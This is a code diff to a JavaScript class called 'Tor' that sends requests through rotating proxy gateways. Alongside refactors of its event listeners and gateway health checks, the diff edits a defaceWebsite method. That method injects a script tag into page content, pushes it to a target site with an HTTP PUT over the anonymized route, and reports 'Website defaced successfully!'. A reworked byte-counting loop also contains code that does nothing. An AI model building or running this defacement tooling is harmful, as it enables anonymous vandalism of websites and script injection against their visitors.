@@ -79,6 +79,7 @@ class Tor {
         this.gatewayBlacklistDuration = 60000;
         this.gatewayCheckEnabled = true;
         this.isCheckingGateways = false;
+        this.gatewayCheckTimeout = 5000;
     }
 
     async initServerInfo() {
@@ -132,26 +133,24 @@ class Tor {
 
     addEventListener(event, callback) {
         if (!this.eventListeners[event]) {
-            this.eventListeners[event] = {};
+            this.eventListeners[event] = [];
         }
-        if (!this.eventListeners[event][callback]) {
-            this.eventListeners[event][callback] = callback;
+        if (!this.eventListeners[event].includes(callback)) {
+            this.eventListeners[event].push(callback);
         }
     }
 
     removeEventListener(event, callback) {
-        if (this.eventListeners[event] && this.eventListeners[event][callback]) {
-            delete this.eventListeners[event][callback];
+        if (this.eventListeners[event]) {
+            this.eventListeners[event] = this.eventListeners[event].filter(cb => cb !== callback);
         }
     }
 
     dispatchEvent(event, data) {
         if (this.eventListeners[event]) {
-            for (const callbackKey in this.eventListeners[event]) {
-                if (this.eventListeners[event].hasOwnProperty(callbackKey)) {
-                    this.eventListeners[event][callbackKey](data);
-                }
-            }
+            this.eventListeners[event].forEach(callback => {
+                callback(data);
+            });
         }
     }
 
@@ -194,13 +193,13 @@ class Tor {
     }
 
     getActiveRequests() {
-        return this.requestQueue.length;
+        return this.requestStats.sent - this.requestStats.success - this.requestStats.failed;
     }
 
     async isGatewayOnline(gateway) {
         try {
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 2000);
+            const timeoutId = setTimeout(() => controller.abort(), this.gatewayCheckTimeout);
             const testUrl = new URL('/httpbin.org/get', gateway).href;
             const response = await fetch(testUrl, {
                 method: 'GET',
@@ -214,10 +213,11 @@ class Tor {
 
             if (!response.ok) {
                 this.log(`Gateway ${gateway} returned status: ${response.status}`, 'warn');
+                this.blacklistGateway(gateway); // Blacklist immediately on non-OK status
                 return false;
             }
 
-            return response.ok;
+            return true;
         } catch (error) {
             this.blacklistGateway(gateway);
             this.log(`Gateway ${gateway} check failed: ${error}`, 'warn');
@@ -240,6 +240,11 @@ class Tor {
         if (!this.gatewayCheckEnabled || this.isCheckingGateways) return;
         this.isCheckingGateways = true;
         this.gatewayMonitoringIntervalId = setInterval(async () => {
+            if (this.failedGateways.size === this.gateways.length) {
+                this.log('All gateways are blacklisted, pausing monitoring.', 'warn');
+                this.stopGatewayMonitoring();
+                return;
+            }
             for (const gateway of this.gateways) {
                 if (!this.failedGateways.has(gateway)) {
                     const isOnline = await this.isGatewayOnline(gateway);
@@ -348,17 +353,29 @@ class Tor {
             if (!response.body) return 0;
             const reader = response.body.getReader();
             let totalBytes = 0;
+            let decoder = new TextDecoder();
+            let partialChunk = "";
+
             while (true) {
                 const { done, value } = await reader.read();
                 if (done) break;
-                totalBytes += value.length;
+
+                let chunk = decoder.decode(value, { stream: !done });
+                chunk = partialChunk + chunk;
+                partialChunk = "";
+
+                if (chunk.length > 0) {
+                    totalBytes += value.length;
+                }
             }
+
             return totalBytes;
         } catch (error) {
             this.log(`Error reading response body: ${error}`, 'warn');
             return 0;
         }
     }
+
 
     fetchWithTor(url, options = {}) {
         return new Promise((resolve, reject) => {
@@ -440,7 +457,7 @@ class Tor {
     }
 
     async defaceWebsite(url) {
-        if (!this.defaceScript) {
+       if (!this.defaceScript) {
             const errorMessage = 'Deface script not set. Use setDefaceScript() first.';
             this.log(errorMessage, 'error');
             return;
@@ -465,7 +482,7 @@ class Tor {
                 targetContent += scriptTag;
             }
 
-            const options = {
+             const putOptions = {
                 method: 'PUT',
                 headers: {
                     'Content-Type': 'text/html',
@@ -476,9 +493,9 @@ class Tor {
                 redirect: 'follow'
             };
 
-            const putResponse = await fetchMethod(url, options);
+            const putResponse = await fetchMethod(url, putOptions);
 
-            if (putResponse.ok) {
+             if (putResponse.ok) {
                 const successMessage = 'Website defaced successfully!';
                 this.log(successMessage, 'success');
             } else {
